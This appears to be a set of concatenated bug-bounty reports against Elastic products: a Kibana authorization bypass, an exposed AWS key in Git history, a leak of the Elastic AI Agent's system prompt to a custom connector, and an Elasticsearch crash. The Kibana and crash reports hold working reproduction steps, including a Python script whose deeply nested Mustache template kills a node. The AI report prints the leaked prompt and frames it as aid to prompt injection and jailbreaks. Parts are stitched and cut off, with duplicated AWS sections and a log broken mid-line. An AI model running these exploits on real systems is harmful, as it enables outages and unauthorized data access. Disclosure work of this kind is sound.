attributes.title: Metrics Experience `9.3.4` lets a user with no Kibana privileges enumerate metric dimensions through an internal route while the sibling route correct
attributes.vulnerability_information:
Kibana `9.3.4` contains an authorization inconsistency in the Metrics Experience internal API surface. The route `GET /internal/metrics_experience/dimensions` is registered with `security.authz.enabled: false` and queries Elasticsearch using `elasticsearch.client.asCurrentUser`, while the sibling route `POST /internal/metrics_experience/fields/_search` correctly enforces `security.authz.requiredPrivileges: ['read']`. 

In live validation, an authenticated user with Elasticsearch read access to a metrics index but no Kibana privileges at all was unable to access the default space and was correctly denied access to the privilege-checked sibling route, yet could still call the dimensions route by supplying the required internal header and receive real metric-dimension values through Kibana. 

This demonstrates a Kibana-side access control bypass that allows a user with no Kibana privileges to use an internal Metrics Experience route to enumerate index-derived data, even though the related feature surface otherwise enforces Kibana privileges.

## Step To Reproduce
## Lab files

This repro uses a dedicated stock `9.3.4` lab:

- docker-compose.metrics-experience-934.yml
- metrics-experience-934-kibana.yml

## Step 1. Start the fresh Docker lab

From the repo root:

```bash
docker compose -p metrics-experience-934 \
  -f validation/docker-compose.metrics-experience-934.yml \
  down -v --remove-orphans

docker compose -p metrics-experience-934 \
  -f validation/docker-compose.metrics-experience-934.yml \
  up -d
```

This lab exposes:

- Kibana: `http://127.0.0.1:5625`
- Elasticsearch: `http://127.0.0.1:9221`

## Step 2. Verify Kibana and Elasticsearch

Set variables:

```bash
export ELK=http://127.0.0.1:5625
export ES=http://127.0.0.1:9221
export ADMIN=elastic:changeme123456
```

Check Kibana:

```bash
curl -s "$ELK/api/status"
```

Do not continue until the body contains:

```json
{"status":{"overall":{"level":"available"}}}
```

Check Elasticsearch:

```bash
curl -s -u "$ADMIN" "$ES"
```

Expected body contains:

```json
{"cluster_name":"docker-cluster"}
```

## Step 3. Optional UI login

Open:

```text
http://127.0.0.1:5625
```

Log in with:

```text
elastic / changeme123456
```

This only confirms the lab is healthy. The exploit path below is curl-based.

## Step 4. Create the victim metrics index and document

Create a simple metrics index with a seeded host name:

```bash
curl -i -s -u "$ADMIN" \
  -H 'Content-Type: application/json' \
  -X PUT "$ES/metrics-report47" \
  -d '{
    "mappings": {
      "properties": {
        "@timestamp": { "type": "date" },
        "host": {
          "properties": {
            "name": { "type": "keyword" }
          }
        },
        "system": {
          "properties": {
            "cpu": {
              "properties": {
                "total": {
                  "properties": {
                    "norm": {
                      "properties": {
                        "pct": { "type": "float" }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }'
```

Expected:

```http
HTTP/1.1 200 OK
```

Now add one document:

```bash
curl -i -s -u "$ADMIN" \
  -H 'Content-Type: application/json' \
  -X POST "$ES/metrics-report47/_doc?refresh=true" \
  -d '{
    "@timestamp": "2026-05-03T15:10:00Z",
    "host": {
      "name": "victim-host-47"
    },
    "system": {
      "cpu": {
        "total": {
          "norm": {
            "pct": 0.42
          }
        }
      }
    }
  }'
```

Expected:

```http
HTTP/1.1 201 Created
```

## Step 5. Create the attacker role and user

The attacker should have:

- Elasticsearch read access to `metrics-report47`
- no Kibana privileges at all

Use these deterministic names:

```bash
export ATTACKER_ROLE=metrics_es_only_report47
export ATTACKER_USER=metrics_es_only_user47
export ATTACKER_PASS='MetricsEsOnly123abc'
```

Create the Elasticsearch-only role:

```bash
curl -i -s -u "$ADMIN" \
  -H 'Content-Type: application/json' \
  -X PUT "$ES/_security/role/$ATTACKER_ROLE" \
  -d '{
    "cluster": [],
    "indices": [
      {
        "names": ["metrics-report47"],
        "privileges": ["read", "view_index_metadata"]
      }
    ]
  }'
```

Expected:

```http
HTTP/1.1 200 OK
```

Create the attacker user:

```bash
curl -i -s -u "$ADMIN" \
  -H 'Content-Type: application/json' \
  -X POST "$ES/_security/user/$ATTACKER_USER" \
  -d "{
    \"password\": \"$ATTACKER_PASS\",
    \"roles\": [\"$ATTACKER_ROLE\"],
    \"full_name\": \"Metrics ES Only\"
  }"
```

Expected on a clean run:

```json
{"created":true}
```

If you want a clean auth check:

```bash
curl -i -s -u "$ADMIN" \
  -H 'Content-Type: application/json' \
  -X POST "$ES/_security/user/$ATTACKER_USER/_password" \
  -d "{
    \"password\": \"$ATTACKER_PASS\"
  }"

curl -i -s -u "$ATTACKER_USER:$ATTACKER_PASS" \
  "$ES/_security/_authenticate"
```

Expected:

```http
HTTP/1.1 200 OK
```

and the body contains:

```json
{"username":"metrics_es_only_user47","roles":["metrics_es_only_report47"]}
```

## Step 6. Boundary: the attacker has no normal Kibana access

As the attacker, try to read the default space:

```bash
curl -i -s -u "$ATTACKER_USER:$ATTACKER_PASS" \
  -H 'kbn-xsrf: 1' \
  "$ELK/api/spaces/space/default"
```

Expected:

```http
HTTP/1.1 403 Forbidden
```

Body contains:

```json
{
  "statusCode": 403,
  "error": "Forbidden",
  "message": "Unauthorized to get default space"
}
```

This shows the attacker truly has no Kibana privileges.

## Step 7. Boundary: the sibling Metrics Experience route correctly blocks the attacker

Call the privilege-checked sibling route:

```bash
curl -i -s -u "$ATTACKER_USER:$ATTACKER_PASS" \
  -H 'x-elastic-internal-origin: research' \
  -H 'kbn-xsrf: 1' \
  -H 'Content-Type: application/json' \
  -X POST "$ELK/internal/metrics_experience/fields/_search" \
  -d '{
    "index": "metrics-report47",
    "from": "2026-05-03T15:00:00.000Z",
    "to": "2026-05-03T15:20:00.000Z",
    "fields": "*",
    "page": 1,
    "size": 100
  }'
```

Expected:

```http
HTTP/1.1 403 Forbidden
```

Body contains:

```json
{
  "statusCode": 403,
  "error": "Forbidden",
  "message": "API [POST /internal/metrics_experience/fields/_search] is unauthorized for user, this action is granted by the Kibana privileges [read]"
}
```

This is the clean boundary for the bug.

## Step 8. Boundary: the vulnerable route is blocked without the internal header

As the same attacker, omit the internal header:

```bash
curl -i -s -u "$ATTACKER_USER:$ATTACKER_PASS" \
  "$ELK/internal/metrics_experience/dimensions?dimensions=%5B%22host.name%22%5D&indices=%5B%22metrics-report47%22%5D&from=2026-05-03T15:00:00.000Z&to=2026-05-03T15:20:00.000Z"
```

Expected:

```http
HTTP/1.1 400 Bad Request
```

Body contains:

```json
{
  "statusCode": 400,
  "error": "Bad Request",
  "message": "uri [/internal/metrics_experience/dimensions] with method [get] exists but is not available with the current configuration"
}
```

## Step 9. Exploit: the attacker uses the internal dimensions route

Now repeat the request with the internal header:

```bash
curl -i -s -u "$ATTACKER_USER:$ATTACKER_PASS" \
  -H 'x-elastic-internal-origin: research' \
  "$ELK/internal/metrics_experience/dimensions?dimensions=%5B%22host.name%22%5D&indices=%5B%22metrics-report47%22%5D&from=2026-05-03T15:00:00.000Z&to=2026-05-03T15:20:00.000Z"
```

Expected:

```http
HTTP/1.1 200 OK
```

and the body contains the victim value:

```json
{
  "values": [
    {
      "value": "victim-host-47",
      "field": "host.name"
    }
  ]
}
```

This is the exploit: the attacker has no Kibana privileges, is blocked by the sibling Metrics Experience route, but can still use the authz-free dimensions route to enumerate real metrics data through Kibana.

## Step 10. Optional admin control read

As admin, confirm the same route returns the same value:

```bash
curl -i -s -u "$ADMIN" \
  -H 'x-elastic-internal-origin: research' \
  "$ELK/internal/metrics_experience/dimensions?dimensions=%5B%22host.name%22%5D&indices=%5B%22metrics-report47%22%5D&from=2026-05-03T15:00:00.000Z&to=2026-05-03T15:20:00.000Z"
```

Expected:

- `HTTP/1.1 200 OK`
- same value:
  - `victim-host-47`

So the finding is:

- a user with no Kibana privileges can still use Kibana’s internal Metrics Experience dimensions route to enumerate metric values when they only have Elasticsearch read access to the underlying index

## Source References
- `kibana/src/platform/plugins/shared/metrics_experience/server/routes/dimensions/route.ts`
- `kibana/src/platform/plugins/shared/metrics_experience/server/routes/fields/route.ts`
- `kibana/src/platform/plugins/shared/metrics_experience/server/plugin.ts`

## Impact

The validated impact is a same-space Kibana feature/access-control bypass:

- a user with no Kibana privileges can still use Kibana as a proxy to enumerate metric-dimension values
- the route discloses real index-derived data, not just schema or UI metadata
- the sibling Metrics Experience route correctly returns `403`, proving this route is less protected than the rest of the feature surface

I am rating this Low from current proof because Elasticsearch privileges still constrain which indices the attacker can query, and the live proof is limited to dimension/value disclosure through Kibana rather than write access or cross-space access. But it is still a real authorization inconsistency that lets a no-Kibana user use an internal Kibana data route that the sibling Metrics Experience route correctly blocks.

attributes.title: Exposed AWS access key and secret key in Elastic Terraform repository
attributes.vulnerability_information:
# Exposed AWS access key and secret key in Elastic Terraform repository

## Summary

An AWS credential pair was found exposed in Elastic's public GitHub organization, in the `elastic/terraform-elastic-esf` repository. The exposed material appears in a Terraform AWS provider configuration block and includes an AWS access key ID plus a corresponding secret key field.

The credential was not validated and no AWS API calls were made. This report is based only on public source-code evidence from GitHub.

## Target

- Program: Elastic
- Platform: HackerOne
- Repository: https://github.com/elastic/terraform-elastic-esf
- Affected file: `main.tf`
- Commit: `fd7729ab44b53a0999bf61069d193e828eff77d3`
- Commit date: 2024-05-24 10:20:18 UTC
- Evidence URL: https://github.com/elastic/terraform-elastic-esf/blob/fd7729ab44b53a0999bf61069d193e828eff77d3/main.tf

## Vulnerability Classification

- Primary CWE: CWE-798 - Use of Hard-coded Credentials
- Related CWE: CWE-522 - Insufficiently Protected Credentials
- Related CWE: CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor
- Suggested severity: High

## Evidence

At the referenced commit, `main.tf` contains an AWS provider configuration with both credential components:

```text
provider "aws" {
  access_key = "AKIA****3WIU"
  secret_key = "<redacted>"
}
```

The access key ID begins with `AKIA`, which is the AWS IAM user access key format. The secret key value is present in the adjacent provider configuration field, but is intentionally redacted here.

Additional metadata:

- Finding ID: 217493
- Detector: TruffleHog
- Detector rule: `aws_access_key`
- Canonical secret kind: `aws_access_key`
- Redacted preview: `AKIA****3WIU`
- Secret hash: `0c13559d94a6d7e52d431ef86abea4fa27212f6d91657dc4ddaa4aba62d8929f`

## Scope Justification

The repository belongs to the public `elastic` GitHub organization and is mapped to the Elastic program in the pipeline. The finding is an own-repository credential exposure, not a third-party credential attribution.

Scope reference used during triage: https://bbscope.com/program/h1/elastic

## Current Exposure Notes

The historical commit remains publicly accessible on GitHub. The same credential line was not present in the current default branch when checked, so the issue is best described as a public Git history exposure.

No credential validation was performed.

## Recommended Remediation

1. Revoke the exposed AWS access key immediately if it has not already been revoked.
2. Rotate any dependent credentials or automation that used this key.
3. Review AWS CloudTrail for usage of the access key from the first public exposure date onward.
4. Remove the credential from Git history using a history-rewriting tool such as `git filter-repo` or BFG, then force-push after coordination.
5. Replace static AWS keys in Terraform configuration with short-lived credentials, IAM roles, or environment-based credential loading.
6. Add repository secret scanning and pre-commit checks to prevent future hard-coded credential commits.

## Validation Boundary

I did not use, test, or validate the credential. No AWS STS call or provider API call was performed. The report only documents that an AWS-formatted access key and adjacent secret key were publicly exposed in GitHub history.

## Impact

If the AWS key pair was active at any point after exposure, an attacker could potentially use it to access AWS resources permitted by the IAM principal. The actual impact depends on attached IAM policies, whether the key has already been revoked, and whether any usage occurred before revocation.

Potential impact includes:

- Unauthorized AWS API access under the exposed IAM identity
- Access to infrastructure resources managed by the Terraform configuration
- Possible data exposure, resource modification, or cost impact depending on IAM permissions

- Commit: `5e6e9c4aee1ab72c36ea10cee5a76a4a5e06c1fa`

## Scope Justification

The repository belongs to the public `elastic` GitHub organization and is mapped to the Elastic program in the pipeline. The finding is an own-repository credential exposure, not a third-party credential attribution.

Scope reference used during triage: https://bbscope.com/program/h1/elastic

## Current Exposure Notes

## Recommended Remediation

1. Revoke the exposed AWS access key immediately if it has not already been revoked.

## Validation Boundary

I did not use, test, or validate the credential. No AWS STS call or provider API call was performed. The report only documents that an AWS-formatted access key and adjacent secret access key were publicly exposed in GitHub history.

## Impact

If the AWS key pair was active at any point after exposure, an attacker could potentially use it to access AWS resources permitted by the IAM principal. The actual impact depends on attached IAM policies, whether the key has already been revoked, and whether any usage occurred before revocation.

attributes.title: Elastic AI Agent system prompt leaks via custom connector
attributes.vulnerability_information:
**Summary:** A normal Elastic Cloud user can configure a custom OpenAI-compatible AI connector for a tester-owned Hosted deployment. When the user selects the default Elastic AI Agent with that connector and sends a chat message, Elastic sends the hidden Elastic AI Agent system prompt and internal multi-agent handoff messages to the tenant-controlled connector URL as part of the `messages` array. The connector endpoint can log the request and recover the full prompt.

**Description:** I created a trial Elastic Cloud account, deployed a default Hosted deployment, and added a custom AI connector from the Agents chat model management UI. The connector URL pointed to my own OpenAI-compatible Flask service. The service forwarded the request to an upstream LLM, but also saved the raw `messages` array it received.

After sending a simple message (`Who are u?`) to the default Elastic AI Agent, my endpoint logged an inbound chat completion request containing Elastic's internal answering-agent prompt, custom visualization rendering instructions, a pre-response compliance checklist, and internal multi-agent orchestration messages such as researcher/dispatcher handoff text. These instructions were not visible in the Elastic UI but were disclosed to the user-controlled connector endpoint.

The test was limited to my own Elastic Cloud account and my own deployment. I did not access another tenant, probe Elastic infrastructure, or attempt to bypass authorization.

## Steps To Reproduce:

1. Start an OpenAI-compatible HTTP service that logs the full inbound `messages` array and exposes a history endpoint. My proof-of-concept used a Flask service with only these relevant routes:

```text
POST /deepseekv4flash/v1/chat/completions
GET  /deepseekv4flash/history?n=1
```

The minimal submission copy is included as:

```text
poc/elastic/20260505_system_prompt_leaks/flask_server_submission_minimal.py
```

2. Create an Elastic Cloud trial account at `https://cloud.elastic.co`.

3. Create a Hosted deployment with the default configuration.

4. Open the deployed Hosted deployment and go to the Agents chat UI.

5. In the lower-left model selector, click `Manage`.

6. Add a custom AI connector with these settings:

```text
Connector name: myflaskllm
Service: OpenAI
Model ID: any value
URL: https://<tester-controlled-host>/deepseekv4flash/v1/chat/completions
API key: any placeholder value accepted by the UI
```

In my test, the public PoC URL used the same path format:

```text
https://<tester-controlled-host>/deepseekv4flash/v1/chat/completions
```

The model id entered in the UI was not material because the PoC endpoint used a fixed upstream model internally.

7. Save the connector.

8. Return to the Agents chat UI.

9. Select the default `Elastic AI Agent` and the newly created `myflaskllm` connector/model.

10. Send a simple message, for example:

```text
Who are u?
```

11. Open the PoC history endpoint:

```text
https://<tester-controlled-host>/deepseekv4flash/history?n=1
```

12. The most recent logged request contains Elastic's hidden prompt and internal orchestration messages in the `messages` array. Sanitized excerpt from my captured evidence:

```json
{
  "model": "deepseek-v4-flash",
  "stream": true,
  "messages": [
    {
      "role": "system",
      "content": "You are an expert enterprise AI assistant from Elastic, the company behind Elasticsearch.\n\nYour role is to be the **final answering agent** in a multi-agent flow. Your **ONLY** capability is to generate a natural language response to the user.\n\n## INSTRUCTIONS\n- Carefully read the original discussion and the gathered information.\n- Synthesize an accurate response that directly answers the user's question.\n- Do not hedge. If the information is complete, provide a confident and final answer.\n- If there are still uncertainties or unresolved issues, acknowledge them clearly and state what is known and what is not.\n- You do not have access to any tools. You MUST NOT, under any circumstances, attempt to call or generate syntax for any tool.\n\n## GUIDELINES\n- Do not mention the research process or that you are an AI or assistant.\n- Do not mention that the answer was generated based on previous steps.\n- Do not repeat the user's question or summarize the JSON input.\n- Do not speculate beyond the gathered information unless logically inferred from it.\n- Do not mention internal reasoning or tool names unless user explicitly asks.\n\n## OUTPUT STYLE\n- Clear, direct, and scoped. No extraneous commentary.\n- Use custom rendering when appropriate.\n- Use minimal Markdown for readability (short bullets; code blocks for queries/JSON when helpful).\n\n## CUSTOM RENDERING\n\n### RENDERING VISUALIZATIONS\nWhen a tool call returns a result of type \"tabular_data\" or \"visualization\", you may render a visualization in the UI by emitting a custom XML element:\n\n<visualization tool-result-id=\"TOOL_RESULT_ID_HERE\" />\n\n## PRE-RESPONSE COMPLIANCE CHECK\n- [ ] I answered with a text response\n- [ ] I did not call any tool\n- [ ] All claims are grounded in tool output, conversation history or user-provided content.\n- [ ] I asked for missing mandatory parameters only when required.\n- [ ] The answer stays within the user's requested scope.\n- [ ] I answered every part of the user's request (identified sub-questions/requirements). If any part could not be answered from sources, I explicitly marked it and asked a focused follow-up.\n- [ ] No internal tool process or names revealed (unless user asked)."
    },
    {
      "role": "user",
      "content": "Who are u?"
    },
    {
      "role": "assistant",
      "content": "[researcher agent] Finished the research step. Handover notes for the answering agent:\n\"\"\"\nReady to answer, no tools needed.\n\"\"\""
    },
    {
      "role": "user",
      "content": "[dispatcher] Ack. Forwarding to answering agent. Please proceed to respond without invoking any additional tools, using only the information gathered so far."
    }
  ]
}
```

13. The full captured evidence is available in:

```text
poc/elastic/20260505_system_prompt_leaks/chat_histtory.json
```

This file shows that the leaked prompt was received by the tenant-controlled connector endpoint before the final visible answer was returned to the Elastic UI.

## Impact:

The affected flow discloses Elastic AI Agent internal prompt and orchestration content to any authenticated Elastic Cloud tenant who configures a custom OpenAI-compatible connector. The disclosed content includes the hidden final-answering-agent system prompt, behavioral constraints, custom rendering syntax, compliance checklist, and internal multi-agent handoff messages.

This is useful to an attacker because it exposes implementation details that are normally hidden from end users. The prompt reveals the agent's expected role, tool restrictions, response rules, rendering contract, and internal workflow assumptions. That information can help an attacker craft more targeted prompt-injection attempts, bypass tests, jailbreak attempts, or social-engineering content against the Elastic AI Agent. It may also disclose proprietary Elastic prompt engineering and internal orchestration design to arbitrary third-party LLM endpoints configured by a tenant.

The issue does not require compromising Elastic infrastructure or another customer account. A trial user can reproduce it with a self-controlled connector endpoint and a default Hosted deployment. I did not demonstrate access to customer data, Elastic production systems, tokens, credentials, integrity impact, or availability impact.

## Supporting Material/References:

- Captured PoC evidence: `chat_history.json`
{F5855561}
- Minimal PoC server for submission: `flask_server_submission_minimal.py`
{F5855561}
- The connector endpoint used during testing was controlled by me.
- The Hosted deployment used during testing was owned by my account.
- No direct probing, scanning, fuzzing, credential abuse, or cross-tenant access was performed.
- The PoC Flask server uses placeholder/default environment variables in the submission copy and does not include API keys.
{F5855557}

## Impact

Elastic Cloud's custom AI connector flow can disclose the hidden Elastic AI Agent system prompt and internal multi-agent orchestration messages to a tenant-controlled OpenAI-compatible endpoint. An authenticated trial user can configure such a connector for a tester-owned Hosted deployment, select the default Elastic AI Agent, send a normal chat message, and read the full prompt from the connector's request logs.

The disclosed data includes Elastic's final-answering-agent instructions, tool restrictions, custom visualization rendering syntax, pre-response compliance checklist, and internal researcher/dispatcher handoff messages. This exposes proprietary prompt/orchestration details and gives attackers better information for targeted prompt-injection, jailbreak, or bypass attempts against the Elastic AI Agent.

I did not demonstrate cross-tenant access, customer data exposure, token exposure, infrastructure access, integrity impact, or availability impact.

attributes.title: Authenticated ElasticSearch Node Crash via Nested Mustache Template Sections
attributes.vulnerability_information:
**Summary:** 
Elasticsearch `9.3.4` can be crashed by a normal authenticated user with only index `read` privilege via a single crafted `/_render/template` request. The payload uses deeply nested ordinary Mustache sections, producing tiny output but exhausting the JVM stack during recursive template evaluation.

**Description:**
Elasticsearch’s `lang-mustache` module evaluates search templates using Mustache Java. After ESA-2024-40/CVE-2024-52979, Elasticsearch added `mustache.max_output_size_bytes` to limit oversized rendered Mustache output. However, the current mitigation does not prevent deeply nested ordinary Mustache sections. A template containing thousands of nested `{{#a}}...{{/a}}` blocks is recursively evaluated by the Mustache engine. Because no generic nesting-depth limit is enforced, evaluation can trigger `StackOverflowError`

## Steps To Reproduce:

1. Start Elasticsearch 9.3.4 using the official Docker image
```bash
docker run --name es-mustache-934-1c2g -d \
    --cpus=1 --memory=2g \
    -p 39401:9200 \
    -e discovery.type=single-node \
    -e ELASTIC_PASSWORD=elastic-password \
    -e xpack.security.http.ssl.enabled=false \
    docker.elastic.co/elasticsearch/elasticsearch:9.3.4
```

2. Wait for Elasticsearch to become healthy
```bash
until curl -s -u elastic:elastic-password \
    http://localhost:39401/_cluster/health >/dev/null; do
    sleep 1
done
```

3. Create a low-privileged role and user with only index `read` privileges
```bash
curl -s -u elastic:elastic-password -H 'Content-Type: application/json' \
    -X POST http://localhost:39401/_security/role/tpl_reader \
    -d '{"indices":[{"names":["tpltest"],"privileges":["read"]}]}'

curl -s -u elastic:elastic-password -H 'Content-Type: application/json' \
    -X POST http://localhost:39401/_security/user/tpl_low \
    -d '{"password":"tpl-low-password","roles":["tpl_reader"]}'
```

4. Confirm the low-privileged user can render a normal template
```bash
python3 - <<'PY'
import base64
import json
import urllib.request

payload = json.dumps({
    "source": "{\"query\":{\"match_all\":{}}}",
    "params": {}
}).encode()

req = urllib.request.Request(
    "http://localhost:39401/_render/template",
    data=payload,
    headers={
        "Content-Type": "application/json",
        "Authorization": "Basic " + base64.b64encode(b"tpl_low:tpl-low-password").decode()
    },
    method="POST"
)

with urllib.request.urlopen(req, timeout=10) as r:
    print("HTTP", r.status)
    print(r.read(200))
PY
```

5. Confirm the docker instance is up
```bash
docker ps -a --filter name=es-mustache-934-1c2g --format '{{.Names}} {{.Status}}'
```

6. Send the crashing Mustache template payload
```bash
cat > /tmp/poc_mustache_crash.py <<'PY'
import base64
import json
import urllib.request

depth = 3000
src = "{{#a}}" * depth
src += "{\"query\":{\"match_all\":{}}}"
src += "{{/a}}" * depth

payload = json.dumps({
    "source": src,
    "params": {
        "a": True
    }
}).encode()

req = urllib.request.Request(
    "http://localhost:39401/_render/template",
    data=payload,
    headers={
        "Content-Type": "application/json",
        "Authorization": "Basic " + base64.b64encode(b"tpl_low:tpl-low-password").decode()
    },
    method="POST"
)

try:
    with urllib.request.urlopen(req, timeout=20) as r:
        print("HTTP", r.status)
        print(r.read(200))
except Exception as e:
    print("request_failed:", repr(e))
PY

python3 /tmp/poc_mustache_crash.py
```

7. Confirm the Elasticsearch container exited
```bash
docker ps -a --filter name=es-mustache-934-1c2g --format '{{.Names}} {{.Status}}'
```

## Impact:
A low-privileged authenticated user can terminate an Elasticsearch node with one small request. The payload is only tens of kilobytes and does not require high request volume, expensive search execution, large result sets, or administrative privileges.

## Supporting Material/References:

**Logs Output**
```bash
$ docker logs es-mustache-934-1c2g
...[T#1]","log.logger":"org.elasticsearch.xpack.security.action.role.TransportPutRoleAction","elasticsearch.cluster.uuid":"RVUb3GdrRvG9EjpZMYCBYg","elasticsearch.node.id":"vpLKJ-JyRvq4ANTIy6PXiA","elasticsearch.node.name":"3daa0cbd4e13","elasticsearch.cluster.name":"docker-cluster"}
{"@timestamp":"2026-05-03T16:14:10.331Z","log.level": "INFO","message":"added user [tpl_low]", "ecs.version": "1.2.0","service.name":"ES_ECS","event.dataset":"elasticsearch.server","process.thread.name":"elasticsearch[3daa0cbd4e13][management][T#1]","log.logger":"org.elasticsearch.xpack.security.action.user.TransportPutUserAction","elasticsearch.cluster.uuid":"RVUb3GdrRvG9EjpZMYCBYg","elasticsearch.node.id":"vpLKJ-JyRvq4ANTIy6PXiA","elasticsearch.node.name":"3daa0cbd4e13","elasticsearch.cluster.name":"docker-cluster"}
{"@timestamp":"2026-05-03T16:14:19.094Z","log.level":"ERROR","message":"fatal error java.lang.StackOverflowError: null\n\tat org.elasticsearch.server@9.3.4/org.elasticsearch.ExceptionsHelper.lambda$maybeDieOnAnotherThread$4(ExceptionsHelper.java:449)\n\tat java.base/java.util.Optional.ifPresent(Optional.java:182)\n\tat org.elasticsearch.server@9.3.4/org.elasticsearch.ExceptionsHelper.maybeDieOnAnotherThread(ExceptionsHelper.java:439)\n\tat org.elasticsearch.transport.netty4@9.3.4/org.elasticsearch.http.netty4.Netty4HttpPipeliningHandler.exceptionCaught(Netty4HttpPipeliningHandler.java:495)\n\tat io.netty.transport@4.1.132.Final/io.netty.channel.AbstractChannelHandlerContext.invokeExceptionCaught(AbstractChannelHandlerContext.java:346)\n\tat io.netty.transport@4.1.132.Final/io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:447)\n\tat io.netty.transport@4.1.132.Final/io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)\n\tat ## Impact
```

An attacker with low Elasticsearch credentials can crash the targeted Elasticsearch node. This can cause denial of service for applications depending on that node, interrupt indexing/search workloads, and destabilize the cluster if repeated against multiple nodes.
